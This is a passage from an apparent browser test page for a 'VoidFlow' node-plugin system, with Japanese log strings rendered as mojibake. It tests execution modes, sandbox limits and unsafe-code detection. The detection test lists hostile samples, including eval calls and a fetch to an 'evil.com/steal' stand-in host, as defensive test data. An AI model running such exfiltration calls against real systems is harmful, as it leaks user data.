                addTestResult('success', `ãƒãƒ¼ãƒ‰å®Ÿè¡Œãƒ†ã‚¹ãƒˆæˆåŠŸ (${successCount}/${testNodes.length})`);
                
            } catch (error) {
                testStats.totalTests++;
                logToArea('integrationLog', `âŒ ãƒãƒ¼ãƒ‰å®Ÿè¡Œãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
                addTestResult('error', `ãƒãƒ¼ãƒ‰å®Ÿè¡Œãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
            }
            
            updateAllStats();
        }

        async function testErrorHandling() {
            logToArea('integrationLog', 'ğŸš¨ ã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°ãƒ†ã‚¹ãƒˆé–‹å§‹');
            
            try {
                if (!nodeIntegration) {
                    await testIntegrationInitialization();
                }
                
                // å­˜åœ¨ã—ãªã„ãƒãƒ¼ãƒ‰ãƒ†ã‚¹ãƒˆ
                try {
                    await mockVoidFlowEngine.executeNode('nonexistent-node', {});
                    logToArea('integrationLog', `âš ï¸ å­˜åœ¨ã—ãªã„ãƒãƒ¼ãƒ‰ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã—ã¾ã›ã‚“ã§ã—ãŸ`);
                } catch (error) {
                    logToArea('integrationLog', `âœ… å­˜åœ¨ã—ãªã„ãƒãƒ¼ãƒ‰ã‚¨ãƒ©ãƒ¼æ­£å¸¸ã‚­ãƒ£ãƒƒãƒ: ${error.message}`);
                }
                
                // ç„¡åŠ¹ãƒ‡ãƒ¼ã‚¿ãƒ†ã‚¹ãƒˆ
                try {
                    await mockVoidFlowEngine.executeNode('input-node', null);
                    logToArea('integrationLog', `âœ… nullå…¥åŠ›ãƒ‡ãƒ¼ã‚¿å‡¦ç†æˆåŠŸ`);
                } catch (error) {
                    logToArea('integrationLog', `âœ… nullå…¥åŠ›ãƒ‡ãƒ¼ã‚¿ã‚¨ãƒ©ãƒ¼å‡¦ç†: ${error.message}`);
                }
                
                // å±é™ºãªã‚«ã‚¹ã‚¿ãƒ ã‚³ãƒ¼ãƒ‰ãƒ†ã‚¹ãƒˆ
                try {
                    await mockVoidFlowEngine.executeNode('unsafe-node', {});
                    logToArea('integrationLog', `âœ… å±é™ºã‚³ãƒ¼ãƒ‰æ¤œå‡ºãƒ»å‡¦ç†æˆåŠŸ`);
                    testStats.evalAvoided++;
                } catch (error) {
                    logToArea('integrationLog', `âœ… å±é™ºã‚³ãƒ¼ãƒ‰ãƒ–ãƒ­ãƒƒã‚¯: ${error.message}`);
                    testStats.securityBlocks++;
                }
                
                testStats.totalTests++;
                testStats.successfulTests++;
                addTestResult('success', 'ã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°ãƒ†ã‚¹ãƒˆæˆåŠŸ');
                
            } catch (error) {
                testStats.totalTests++;
                logToArea('integrationLog', `âŒ ã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°ãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
                addTestResult('error', `ã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°ãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
            }
            
            updateAllStats();
        }

        // ==========================================
        // âš¡ ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ãƒ»äº’æ›æ€§ãƒ†ã‚¹ãƒˆ
        // ==========================================

        async function testPerformanceComparison() {
            logToArea('performanceLog', 'âš¡ ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹æ¯”è¼ƒãƒ†ã‚¹ãƒˆé–‹å§‹');
            
            try {
                if (!nodeIntegration) {
                    await testIntegrationInitialization();
                }
                
                // nodeIntegrationãŒç¢ºå®Ÿã«åˆæœŸåŒ–ã•ã‚Œã¦ã„ã‚‹ã‹å†ç¢ºèª
                if (!nodeIntegration || typeof nodeIntegration.setExecutionMode !== 'function') {
                    throw new Error('NodeIntegration not properly initialized');
                }
                
                const iterations = 10;
                const testData = { value: 'performance test' };
                
                // ãƒ—ãƒ©ã‚°ã‚¤ãƒ³å®Ÿè¡Œæ™‚é–“æ¸¬å®š
                nodeIntegration.setExecutionMode('unified');
                const pluginTimes = [];
                
                for (let i = 0; i < iterations; i++) {
                    const start = performance.now();
                    await mockVoidFlowEngine.executeNode('input-node', testData);
                    pluginTimes.push(performance.now() - start);
                }
                
                // ãƒ¬ã‚¬ã‚·ãƒ¼å®Ÿè¡Œæ™‚é–“æ¸¬å®š
                nodeIntegration.setExecutionMode('legacy');
                const legacyTimes = [];
                
                for (let i = 0; i < iterations; i++) {
                    const start = performance.now();
                    await mockVoidFlowEngine.executeNode('input-node', testData);
                    legacyTimes.push(performance.now() - start);
                }
                
                // çµ±åˆãƒ¢ãƒ¼ãƒ‰ã«æˆ»ã™
                nodeIntegration.setExecutionMode('unified');
                
                const pluginAvg = pluginTimes.reduce((a, b) => a + b, 0) / pluginTimes.length;
                const legacyAvg = legacyTimes.reduce((a, b) => a + b, 0) / legacyTimes.length;
                const improvement = ((legacyAvg - pluginAvg) / legacyAvg * 100);
                
                logToArea('performanceLog', `ğŸ“Š ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹æ¯”è¼ƒçµæœ (${iterations}å›å®Ÿè¡Œ):`);
                logToArea('performanceLog', `   ğŸ”Œ ãƒ—ãƒ©ã‚°ã‚¤ãƒ³å¹³å‡: ${pluginAvg.toFixed(2)}ms`);
                logToArea('performanceLog', `   ğŸ›ï¸ ãƒ¬ã‚¬ã‚·ãƒ¼å¹³å‡: ${legacyAvg.toFixed(2)}ms`);
                logToArea('performanceLog', `   ğŸ“ˆ æ”¹å–„åº¦: ${improvement.toFixed(1)}%`);
                
                // çµ±è¨ˆæ›´æ–°
                executionTimes.plugin = pluginTimes;
                executionTimes.legacy = legacyTimes;
                
                testStats.totalTests++;
                testStats.successfulTests++;
                addTestResult('success', `ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹æ¯”è¼ƒå®Œäº† (æ”¹å–„: ${improvement.toFixed(1)}%)`);
                
            } catch (error) {
                testStats.totalTests++;
                logToArea('performanceLog', `âŒ ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
                logToArea('performanceLog', `   ğŸ” ã‚¨ãƒ©ãƒ¼è©³ç´°: ${error.stack || 'ã‚¹ã‚¿ãƒƒã‚¯ãƒˆãƒ¬ãƒ¼ã‚¹ãªã—'}`);
                logToArea('performanceLog', `   ğŸ”§ nodeIntegrationçŠ¶æ…‹: ${nodeIntegration ? 'ã‚ã‚Š' : 'ãªã—'}`);
                if (nodeIntegration) {
                    logToArea('performanceLog', `   ğŸ”§ setExecutionMode: ${typeof nodeIntegration.setExecutionMode}`);
                }
                addTestResult('error', `ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹æ¯”è¼ƒãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
            }
            
            updateAllStats();
        }

        async function testBackwardCompatibility() {
            logToArea('performanceLog', 'ğŸ›ï¸ ä¸‹ä½äº’æ›æ€§ãƒ†ã‚¹ãƒˆé–‹å§‹');
            
            try {
                if (!nodeIntegration) {
                    await testIntegrationInitialization();
                }
                
                const compatibilityTests = [
                    { mode: 'unified', description: 'çµ±åˆãƒ¢ãƒ¼ãƒ‰' },
                    { mode: 'legacy', description: 'ãƒ¬ã‚¬ã‚·ãƒ¼ãƒ¢ãƒ¼ãƒ‰' },
                    { mode: 'hybrid', description: 'ãƒã‚¤ãƒ–ãƒªãƒƒãƒ‰ãƒ¢ãƒ¼ãƒ‰' }
                ];
                
                let compatibleModes = 0;
                
                for (const test of compatibilityTests) {
                    try {
                        nodeIntegration.setExecutionMode(test.mode);
                        
                        const result = await mockVoidFlowEngine.executeNode('input-node', {
                            test: 'compatibility',
                            mode: test.mode
                        });
                        
                        logToArea('performanceLog', `âœ… ${test.description}: äº’æ›æ€§OK`);
                        compatibleModes++;
                        
                    } catch (error) {
                        logToArea('performanceLog', `âŒ ${test.description}: ${error.message}`);
                    }
                }
                
                const compatibilityRate = (compatibleModes / compatibilityTests.length) * 100;
                logToArea('performanceLog', `ğŸ“Š äº’æ›æ€§ãƒ†ã‚¹ãƒˆçµæœ: ${compatibleModes}/${compatibilityTests.length} (${compatibilityRate}%)`);
                
                testStats.totalTests++;
                testStats.successfulTests++;
                addTestResult('success', `ä¸‹ä½äº’æ›æ€§ãƒ†ã‚¹ãƒˆæˆåŠŸ (${compatibilityRate}%äº’æ›)`);
                
            } catch (error) {
                testStats.totalTests++;
                logToArea('performanceLog', `âŒ ä¸‹ä½äº’æ›æ€§ãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
                addTestResult('error', `ä¸‹ä½äº’æ›æ€§ãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
            }
            
            updateAllStats();
        }

        async function testAllNodeTypes() {
            logToArea('performanceLog', 'ğŸ¯ å…¨ãƒãƒ¼ãƒ‰ã‚¿ã‚¤ãƒ—ãƒ†ã‚¹ãƒˆé–‹å§‹');
            
            try {
                if (!nodeIntegration) {
                    await testIntegrationInitialization();
                }
                
                const nodeTypes = [
                    'input.text', 'input.number', 'button.send',
                    'string.uppercase', 'string.lowercase', 'string.length',
                    'math.add', 'math.multiply',
                    'output.console', 'output.alert',
                    'web.fetch', 'json.parse', 'json.stringify',
                    'ui.card'
                ];
                
                let successCount = 0;
                
                for (const nodeType of nodeTypes) {
                    try {
                        // å‹•çš„ãƒãƒ¼ãƒ‰ä½œæˆ
                        const testNodeId = `test-${nodeType.replace('.', '-')}`;
                        mockVoidFlowEngine.nodes.set(testNodeId, {
                            id: testNodeId,
                            type: nodeType,
                            config: {},
                            customCode: null
                        });
                        
                        const testData = getTestDataForNodeType(nodeType);
                        const result = await mockVoidFlowEngine.executeNode(testNodeId, testData);
                        
                        logToArea('performanceLog', `âœ… ${nodeType}: å®Ÿè¡ŒæˆåŠŸ`);
                        successCount++;
                        
                    } catch (error) {
                        logToArea('performanceLog', `âŒ ${nodeType}: ${error.message}`);
                    }
                }
                
                const successRate = (successCount / nodeTypes.length) * 100;
                logToArea('performanceLog', `ğŸ“Š å…¨ãƒãƒ¼ãƒ‰ã‚¿ã‚¤ãƒ—ãƒ†ã‚¹ãƒˆçµæœ: ${successCount}/${nodeTypes.length} (${successRate}%)`);
                
                testStats.totalTests++;
                testStats.successfulTests++;
                addTestResult('success', `å…¨ãƒãƒ¼ãƒ‰ã‚¿ã‚¤ãƒ—ãƒ†ã‚¹ãƒˆæˆåŠŸ (${successRate}%æˆåŠŸ)`);
                
            } catch (error) {
                testStats.totalTests++;
                logToArea('performanceLog', `âŒ å…¨ãƒãƒ¼ãƒ‰ã‚¿ã‚¤ãƒ—ãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
                addTestResult('error', `å…¨ãƒãƒ¼ãƒ‰ã‚¿ã‚¤ãƒ—ãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
            }
            
            updateAllStats();
        }

        // ==========================================
        // ğŸ“Š å¯è¦–åŒ–ã¨ãƒ‡ãƒ¢
        // ==========================================

        async function runNodeExecutionDemo() {
            const vizArea = document.getElementById('nodeViz');
            vizArea.innerHTML = '<div style="color: #9b59b6; margin-bottom: 10px;">ãƒãƒ¼ãƒ‰å®Ÿè¡Œãƒ‡ãƒ¢å®Ÿè¡Œä¸­...</div>';
            
            const nodeTypes = ['input.text', 'math.add', 'output.console'];
            let completedCount = 0;
            
            for (const nodeType of nodeTypes) {
                const nodeEl = document.createElement('div');
                nodeEl.className = 'node-item executing';
                nodeEl.textContent = nodeType;
                vizArea.appendChild(nodeEl);
                
                try {
                    await new Promise(resolve => setTimeout(resolve, 500));
                    
                    const testData = getTestDataForNodeType(nodeType);
                    const nodeId = `demo-${nodeType.replace('.', '-')}`;
                    
                    mockVoidFlowEngine.nodes.set(nodeId, {
                        id: nodeId,
                        type: nodeType,
                        config: {},
                        customCode: null
                    });
                    
                    await mockVoidFlowEngine.executeNode(nodeId, testData);
                    
                    nodeEl.className = 'node-item completed';
                    completedCount++;
                    
                } catch (error) {
                    nodeEl.className = 'node-item error';
                    nodeEl.title = error.message;
                }
                
                updateNodeVizStats();
            }
        }

        async function runAllNodeTypesDemo() {
            const vizArea = document.getElementById('nodeViz');
            vizArea.innerHTML = '<div style="color: #9b59b6; margin-bottom: 10px;">å…¨ãƒãƒ¼ãƒ‰ã‚¿ã‚¤ãƒ—ãƒ‡ãƒ¢å®Ÿè¡Œä¸­...</div>';
            
            const standardPlugins = createAllStandardNodePlugins();
            let completedCount = 0;
            
            for (const [nodeType] of standardPlugins) {
                const nodeEl = document.createElement('div');
                nodeEl.className = 'node-item executing';
                nodeEl.textContent = nodeType;
                vizArea.appendChild(nodeEl);
                
                try {
                    await new Promise(resolve => setTimeout(resolve, 200));
                    
                    const testData = getTestDataForNodeType(nodeType);
                    const nodeId = `alldemo-${nodeType.replace('.', '-')}`;
                    
                    mockVoidFlowEngine.nodes.set(nodeId, {
                        id: nodeId,
                        type: nodeType,
                        config: {},
                        customCode: null
                    });
                    
                    await mockVoidFlowEngine.executeNode(nodeId, testData);
                    
                    nodeEl.className = 'node-item completed';
                    completedCount++;
                    
                } catch (error) {
                    nodeEl.className = 'node-item error';
                    nodeEl.title = error.message;
                }
                
                updateNodeVizStats();
            }
        }

        // ==========================================
        // ğŸ›¡ï¸ ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ†ã‚¹ãƒˆè©³ç´°
        // ==========================================

        async function testDangerousCode() {
            logToArea('securityLog', 'ğŸš¨ å±é™ºã‚³ãƒ¼ãƒ‰æ¤œå‡ºãƒ†ã‚¹ãƒˆé–‹å§‹');
            
            try {
                if (!nodeIntegration) {
                    await testIntegrationInitialization();
                }
                
                const dangerousCodes = [
                    'eval("console.log(\'dangerous\')")',
                    'new Function("return 1")()',
                    'document.write("hack")',
                    'localStorage.setItem("evil", "data")',
                    'fetch("http://evil.com/steal")'
                ];
                
                let detectedCount = 0;
                
                for (const code of dangerousCodes) {
                    const detected = nodeIntegration.containsUnsafeCode(code);
                    if (detected) {
                        detectedCount++;
                        logToArea('securityLog', `âœ… å±é™ºã‚³ãƒ¼ãƒ‰æ¤œå‡º: ${code.substring(0, 30)}...`);
                    } else {
                        logToArea('securityLog', `âš ï¸ æ¤œå‡ºæ¼ã‚Œ: ${code.substring(0, 30)}...`);
                    }
                }
                
                testStats.dangerousCodeDetected += detectedCount;
                logToArea('securityLog', `ğŸ“Š å±é™ºã‚³ãƒ¼ãƒ‰æ¤œå‡ºçµæœ: ${detectedCount}/${dangerousCodes.length}`);
                
                testStats.totalTests++;
                testStats.successfulTests++;
                addTestResult('success', `å±é™ºã‚³ãƒ¼ãƒ‰æ¤œå‡ºãƒ†ã‚¹ãƒˆæˆåŠŸ (${detectedCount}/${dangerousCodes.length})`);
                
            } catch (error) {
                testStats.totalTests++;
                logToArea('securityLog', `âŒ å±é™ºã‚³ãƒ¼ãƒ‰æ¤œå‡ºãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
                addTestResult('error', `å±é™ºã‚³ãƒ¼ãƒ‰æ¤œå‡ºãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
            }
            
            updateAllStats();
        }

        async function testMemoryLimits() {
            logToArea('securityLog', 'ğŸ’¾ ãƒ¡ãƒ¢ãƒªåˆ¶é™ãƒ†ã‚¹ãƒˆé–‹å§‹');
            
            try {
                const memoryTestPlugin = new VoidFlowNodePlugin({
                    nodeType: 'test.memory',
                    pluginId: 'memory-test-plugin',
                    sandbox: {
                        memoryLimit: 1024 * 1024 // 1MBåˆ¶é™
                    },
                    executeFunction: async (inputData, context) => {
                        // å¤§é‡ãƒ¡ãƒ¢ãƒªä½¿ç”¨è©¦è¡Œï¼ˆã‚·ãƒŸãƒ¥ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ï¼‰
                        const largeArray = new Array(100000).fill('memory test');
                        context.console.log(`Large array created: ${largeArray.length} items`);
                        return { memoryTest: 'completed', arraySize: largeArray.length };
                    }
                });
                
                const result = await memoryTestPlugin.execute({}, { nodeId: 'memory-test' });
                logToArea('securityLog', `âœ… ãƒ¡ãƒ¢ãƒªãƒ†ã‚¹ãƒˆå®Ÿè¡Œå®Œäº†: ${result.arraySize} items`);
                
                testStats.totalTests++;
                testStats.successfulTests++;
                addTestResult('success', 'ãƒ¡ãƒ¢ãƒªåˆ¶é™ãƒ†ã‚¹ãƒˆå®Œäº†');
                
            } catch (error) {
                if (error.message.includes('Memory limit')) {
                    testStats.memoryViolationsPrevented++;
                    logToArea('securityLog', `âœ… ãƒ¡ãƒ¢ãƒªåˆ¶é™æ­£å¸¸å‹•ä½œ: ${error.message}`);
                    testStats.totalTests++;
                    testStats.successfulTests++;
                    addTestResult('success', 'ãƒ¡ãƒ¢ãƒªåˆ¶é™ãƒ†ã‚¹ãƒˆæˆåŠŸï¼ˆåˆ¶é™ç™ºå‹•ï¼‰');
                } else {
                    testStats.totalTests++;
                    logToArea('securityLog', `âŒ ãƒ¡ãƒ¢ãƒªåˆ¶é™ãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
                    addTestResult('error', `ãƒ¡ãƒ¢ãƒªåˆ¶é™ãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
                }
            }
            
            updateAllStats();
        }

        async function testTimeoutHandling() {
            logToArea('securityLog', 'â° ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆå‡¦ç†ãƒ†ã‚¹ãƒˆé–‹å§‹');
            
            try {
                const timeoutTestPlugin = new VoidFlowNodePlugin({
                    nodeType: 'test.timeout',
                    pluginId: 'timeout-test-plugin',
                    sandbox: {
                        maxExecutionTime: 1000 // 1ç§’åˆ¶é™
                    },
                    executeFunction: async (inputData, context) => {
                        // é•·æ™‚é–“å®Ÿè¡Œã‚·ãƒŸãƒ¥ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³
                        const sleepTime = inputData.sleepTime || 2000;
                        await context.sleep(sleepTime);
                        return { completed: true, sleepTime: sleepTime };
                    }
                });
                
                const result = await timeoutTestPlugin.execute({ sleepTime: 2000 }, { nodeId: 'timeout-test' });
                logToArea('securityLog', `âš ï¸ ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆãŒç™ºå‹•ã—ã¾ã›ã‚“ã§ã—ãŸ: ${result.sleepTime}ms`);
                
                testStats.totalTests++;
                addTestResult('warning', 'ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆå‡¦ç†ãƒ†ã‚¹ãƒˆï¼ˆã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆæœªç™ºå‹•ï¼‰');
                
            } catch (error) {
                if (error.message.includes('timeout')) {
                    testStats.timeoutsTriggered++;
                    logToArea('securityLog', `âœ… ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆæ­£å¸¸å‹•ä½œ: ${error.message}`);
                    testStats.totalTests++;
                    testStats.successfulTests++;
                    addTestResult('success', 'ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆå‡¦ç†ãƒ†ã‚¹ãƒˆæˆåŠŸ');
                } else {
                    testStats.totalTests++;
                    logToArea('securityLog', `âŒ ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
                    addTestResult('error', `ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆå‡¦ç†ãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
                }
            }
            
            updateAllStats();
        }

        async function testSandboxIsolation() {
            logToArea('securityLog', 'ğŸ–ï¸ ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹åˆ†é›¢ãƒ†ã‚¹ãƒˆé–‹å§‹');
            
            try {
                const isolationTestPlugin = new VoidFlowNodePlugin({
                    nodeType: 'test.isolation',
                    pluginId: 'isolation-test-plugin',
                    executeFunction: async (inputData, context) => {
                        const isolationResults = {
                            hasGlobalAccess: typeof window !== 'undefined',
                            hasNodeAccess: typeof process !== 'undefined',
                            hasFileAccess: typeof require !== 'undefined',
                            contextProperlyIsolated: true
                        };
                        
                        // ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆåˆ†é›¢ç¢ºèª
                        try {
                            context.dangerousAPI();
                        } catch (e) {
                            isolationResults.contextProperlyIsolated = true;
                        }
                        
                        return isolationResults;
                    }
                });
                
                const result = await isolationTestPlugin.execute({}, { nodeId: 'isolation-test' });
                
                logToArea('securityLog', `ğŸ“Š ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹åˆ†é›¢çµæœ:`);
                logToArea('securityLog', `   ğŸŒ ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚¢ã‚¯ã‚»ã‚¹: ${result.hasGlobalAccess ? 'å¯èƒ½' : 'ãƒ–ãƒ­ãƒƒã‚¯'}`);
                logToArea('securityLog', `   ğŸ“ ãƒ•ã‚¡ã‚¤ãƒ«ã‚¢ã‚¯ã‚»ã‚¹: ${result.hasFileAccess ? 'å¯èƒ½' : 'ãƒ–ãƒ­ãƒƒã‚¯'}`);
                logToArea('securityLog', `   ğŸ”’ ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆåˆ†é›¢: ${result.contextProperlyIsolated ? 'æ­£å¸¸' : 'å•é¡Œ'}`);
                
                const securityLevel = (!result.hasFileAccess && result.contextProperlyIsolated) ? 100 : 70;
                
                testStats.totalTests++;
                testStats.successfulTests++;
                addTestResult('success', `ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹åˆ†é›¢ãƒ†ã‚¹ãƒˆæˆåŠŸ (${securityLevel}%å®‰å…¨)`);
                
            } catch (error) {
                testStats.totalTests++;
                logToArea('securityLog', `âŒ ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹åˆ†é›¢ãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
                addTestResult('error', `ã‚µãƒ³ãƒ‰ãƒœãƒƒã‚¯ã‚¹åˆ†é›¢ãƒ†ã‚¹ãƒˆå¤±æ•—: ${error.message}`);
            }
            
            updateAllStats();
        }

        // ==========================================
        // ğŸ› ï¸ ãƒ¦ãƒ¼ãƒ†ã‚£ãƒªãƒ†ã‚£
        // ==========================================

        function getTestDataForNodeType(nodeType) {
            const testDataMap = {
                'input.text': { text: 'test input', value: 'sample text' },
                'input.number': { number: 42, value: 123 },
                'button.send': { trigger: true },
                'string.uppercase': { text: 'hello world' },
                'string.lowercase': { text: 'HELLO WORLD' },
                'string.length': { text: 'test string' },
                'math.add': { a: 5, b: 3 },
                'math.multiply': { a: 4, b: 6 },
                'output.console': { message: 'test output' },
                'output.alert': { message: 'test alert' },
                'web.fetch': { url: 'https://api.github.com/users/octocat' },
                'json.parse': { json: '{"test": "data", "number": 42}' },
                'json.stringify': { data: { test: 'object', array: [1, 2, 3] } },
                'ui.card': { title: 'Test Card', content: 'Test content' }
            };
            
            return testDataMap[nodeType] || { test: 'default data' };
        }

        function logToArea(areaId, message) {
            const area = document.getElementById(areaId);
            const timestamp = new Date().toLocaleTimeString();
            area.innerHTML += `<div>[${timestamp}] ${message}</div>`;
            area.scrollTop = area.scrollHeight;
        }

        function addTestResult(type, message) {
            const resultsArea = document.getElementById('testResults');
            const resultDiv = document.createElement('div');
            resultDiv.className = `test-result ${type}`;
            resultDiv.textContent = message;
            resultsArea.appendChild(resultDiv);
        }

        function updateNodeVizStats() {
            const executingNodes = document.querySelectorAll('.node-item.executing').length;
            const completedNodes = document.querySelectorAll('.node-item.completed').length;
            
            document.getElementById('executingNodes').textContent = executingNodes;
            document.getElementById('completedNodes').textContent = completedNodes;
        }

        function updateAllStats() {
            // ãƒ—ãƒ©ã‚°ã‚¤ãƒ³çµ±è¨ˆ
            document.getElementById('standardPlugins').textContent = testStats.standardPlugins;
            document.getElementById('customPlugins').textContent = testStats.customPlugins;
            document.getElementById('successfulExecutions').textContent = testStats.successfulExecutions;
            document.getElementById('securityBlocks').textContent = testStats.securityBlocks;
            
            // çµ±åˆå®Ÿè¡Œçµ±è¨ˆ
            document.getElementById('pluginExecutions').textContent = testStats.pluginExecutions;
            document.getElementById('legacyExecutions').textContent = testStats.legacyExecutions;
            document.getElementById('evalAvoided').textContent = testStats.evalAvoided;
            
            const avgTime = executionTimes.plugin.length > 0 ? 
                (executionTimes.plugin.reduce((a, b) => a + b, 0) / executionTimes.plugin.length).toFixed(1) : 0;
            document.getElementById('avgExecutionTime').textContent = avgTime + 'ms';
            
            // ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹çµ±è¨ˆ
            if (executionTimes.plugin.length > 0 && executionTimes.legacy.length > 0) {
                const pluginAvg = executionTimes.plugin.reduce((a, b) => a + b, 0) / executionTimes.plugin.length;
                const legacyAvg = executionTimes.legacy.reduce((a, b) => a + b, 0) / executionTimes.legacy.length;
                const improvement = ((legacyAvg - pluginAvg) / legacyAvg * 100);
                
                document.getElementById('pluginSpeed').textContent = pluginAvg.toFixed(1) + 'ms';
                document.getElementById('legacySpeed').textContent = legacyAvg.toFixed(1) + 'ms';
                document.getElementById('speedImprovement').textContent = improvement.toFixed(1) + '%';
            }
            
            // ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£çµ±è¨ˆ
            document.getElementById('dangerousCodeDetected').textContent = testStats.dangerousCodeDetected;
            document.getElementById('memoryViolationsPrevented').textContent = testStats.memoryViolationsPrevented;
            document.getElementById('timeoutsTriggered').textContent = testStats.timeoutsTriggered;
            
            const securityScore = Math.max(0, 100 - (testStats.dangerousCodeDetected * 5));
            document.getElementById('securityScore').textContent = securityScore + '%';
            
            // çµ±åˆçµ±è¨ˆ
            document.getElementById('totalTests').textContent = testStats.totalTests;
            document.getElementById('successfulTests').textContent = testStats.successfulTests;
            
            const successRate = testStats.totalTests > 0 ? (testStats.successfulTests / testStats.totalTests) * 100 : 0;
            document.getElementById('integrationLevel').textContent = Math.round(successRate) + '%';
            
            const evalEliminationRate = Math.min(100, (testStats.evalAvoided + testStats.securityBlocks) * 10);
            document.getElementById('evalEliminationRate').textContent = evalEliminationRate + '%';
        }

        async function runFullTestSuite() {
            addTestResult('info', 'ğŸš€ Phase 2 å…¨ãƒ†ã‚¹ãƒˆã‚¹ã‚¤ãƒ¼ãƒˆé–‹å§‹');
            
            // é †æ¬¡å®Ÿè¡Œ
            await testNodePluginCreation();
            await new Promise(resolve => setTimeout(resolve, 300));
            
            await testCustomPluginCreation();
            await new Promise(resolve => setTimeout(resolve, 300));
            
            await testSandboxExecution();
            await new Promise(resolve => setTimeout(resolve, 300));
            
            await testSecurityRestrictions();
            await new Promise(resolve => setTimeout(resolve, 300));
            
            await testIntegrationInitialization();
            await new Promise(resolve => setTimeout(resolve, 300));
            
            await testMethodOverrides();
            await new Promise(resolve => setTimeout(resolve, 300));
            
            await testNodeExecution();
            await new Promise(resolve => setTimeout(resolve, 300));
            
            await testErrorHandling();
            await new Promise(resolve => setTimeout(resolve, 300));
            
            await testPerformanceComparison();
            await new Promise(resolve => setTimeout(resolve, 300));
            
            await testBackwardCompatibility();
            await new Promise(resolve => setTimeout(resolve, 300));
            
            await testAllNodeTypes();
            await new Promise(resolve => setTimeout(resolve, 300));
            
            await testDangerousCode();
            await new Promise(resolve => setTimeout(resolve, 300));
            
            await testMemoryLimits();
            await new Promise(resolve => setTimeout(resolve, 300));
            
            await testTimeoutHandling();
            await new Promise(resolve => setTimeout(resolve, 300));
            
            await testSandboxIsolation();
            await new Promise(resolve => setTimeout(resolve, 500));
            
            addTestResult('success', 'ğŸ‰ Phase 2 å…¨ãƒ†ã‚¹ãƒˆã‚¹ã‚¤ãƒ¼ãƒˆå®Œäº†');
            updateAllStats();
        }

        function clearAllTests() {
            document.getElementById('pluginLog').innerHTML = '';
            document.getElementById('integrationLog').innerHTML = '';
            document.getElementById('performanceLog').innerHTML = '';
            document.getElementById('securityLog').innerHTML = '';
            document.getElementById('testResults').innerHTML = '';
            document.getElementById('nodeViz').innerHTML = '<div style="color: #666; text-align: center; margin-top: 50px;">ãƒãƒ¼ãƒ‰å®Ÿè¡Œã‚’é–‹å§‹ã—ã¦ãã ã•ã„</div>';
            
            testStats = {
                totalTests: 0,
                successfulTests: 0,
                standardPlugins: 0,
                customPlugins: 0,
                successfulExecutions: 0,
                securityBlocks: 0,
                pluginExecutions: 0,
                legacyExecutions: 0,
                evalAvoided: 0,
                dangerousCodeDetected: 0,
                memoryViolationsPrevented: 0,
                timeoutsTriggered: 0
            };
            
            executionTimes = {
                plugin: [],
                legacy: []
            };
            
            updateAllStats();
            addTestResult('info', 'ğŸ§¹ å…¨ãƒ†ã‚¹ãƒˆã‚¯ãƒªã‚¢å®Œäº†');
        }

        function exportTestResults() {
            const results = {
                phase: 'Phase 2: ãƒãƒ¼ãƒ‰â†’ãƒ—ãƒ©ã‚°ã‚¤ãƒ³çµ±ä¸€',
                timestamp: new Date().toISOString(),
                testStats: testStats,
                executionTimes: executionTimes,
                integrationStats: nodeIntegration ? nodeIntegration.getIntegrationStats() : null,
                voidCoreStats: voidCore.getSystemStats()
            };
            
            const blob = new Blob([JSON.stringify(results, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `voidflow-integration-phase2-results-${Date.now()}.json`;
            a.click();
